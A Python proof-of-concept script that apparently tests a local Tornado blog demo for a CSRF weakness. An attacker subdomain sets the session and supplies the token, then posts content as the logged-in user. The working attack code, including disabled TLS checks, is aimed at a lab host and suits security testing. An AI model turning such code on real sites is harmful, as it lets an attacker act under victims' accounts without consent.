import requests
from bs4 import BeautifulSoup
import random

TARGET = 'http://localtest.me/'
ATTACKER = 'http://attack.localtest.me/'
PRIVATE_KEY = './server/localtest.me.crt'

USER1 = 'alice'
USER2 = 'bob'
PASSWORD = "password"
EMAIL1 = f"{USER1}@{random.randint(0,10000)}.com"


session_cookie_name = 'blogdemo_user'
csrf_cookie_name = '_xsrf'
csrf_form_name = '_xsrf'


SUCCESSFUL_LOGIN = "Sign out"


def get_csrf_token(page):
    token = BeautifulSoup(page, 'html.parser').find("input", {"name" : csrf_form_name})['value']
    return token

def create_user(user, email, password = PASSWORD):
    r = s.get(TARGET + 'auth/create', verify = False)
    csrf_token = get_csrf_token(r.text)

    data = {'email' : email, 'name' : user, 'password' : PASSWORD, '_xsrf' : csrf_token}
    r = s.post(TARGET + 'auth/create', data = data, verify = False)
    assert 'Sign out' in r.text


def login_tornado(email):
    r = s.get(TARGET + 'auth/login')
    csrf_token = get_csrf_token(r.text)
    assert 'Sign in' in r.text
    
    # session only exists after login

    data = {'email' : email, 'password' : PASSWORD, '_xsrf' : csrf_token}
    r = s.post(TARGET + 'auth/login', data = data)

    assert SUCCESSFUL_LOGIN in r.text

    return r


def logout_tornado():
    r = s.get(TARGET + 'auth/logout', params = {'next' : '/'})
    assert 'Sign in' in r.text


def csrf_post_tornado(csrf_token, my_text):
    r = s.get(TARGET + 'compose')
    csrf_token = get_csrf_token(r.text)

    data = {'title' : "This post was created from the attacker.site", 'markdown' : my_text, '_xsrf' : csrf_token}

    return s.post(TARGET + 'compose', data = data)


with requests.Session() as s:
    print("[+] Testing login")

    r = s.get(TARGET, verify = False)
    create_user(USER1, EMAIL1)
    logout_tornado()

    ### Access main page
    r = s.get(TARGET, verify = False)
    assert 'Sign in' in r.text

    r = login_tornado(EMAIL1)

    logout_tornado()

    print("  - Checks passed")


with requests.Session() as s:
    print("[+] Testing post-login CSRF attack")

    r_target = s.get(TARGET, verify = False)
    assert "Sign in" in r_target.text

    ### TARGET LOGIN
    r_target = login_tornado(EMAIL1)

    ### Attacker Setting Post-Session
    s.get(ATTACKER, verify = False)
    r_attacker = s.get(ATTACKER + 'set_post_session')
    ### extract csrf token to use later
    csrf_token_attacker = get_csrf_token(r_attacker.text)

    ### ATTACKER Succeeds in performing CSRF protected operation on behalf uf USER1
    new_text = f"ATTACK {random.randint(0,10000)}"
    print(f"Created post: {new_text}")
    r_attacker = csrf_post_tornado(csrf_token_attacker, new_text)

    assert f"This post was created from the attacker.site (published by {USER1})" in r_attacker.text, " NOT VULNERABLE to pre-login CSRF attack"
    assert new_text in r_attacker.text, " NOT VULNERABLE to pre-login CSRF attack"

    r_target = s.get(TARGET, verify = False)
    assert f"This post was created from the attacker.site (published by {USER1})" in r_target.text
    assert new_text in r_target.text

    logout_tornado()

    print("  - Vulnerable to post-login CSRF attack")
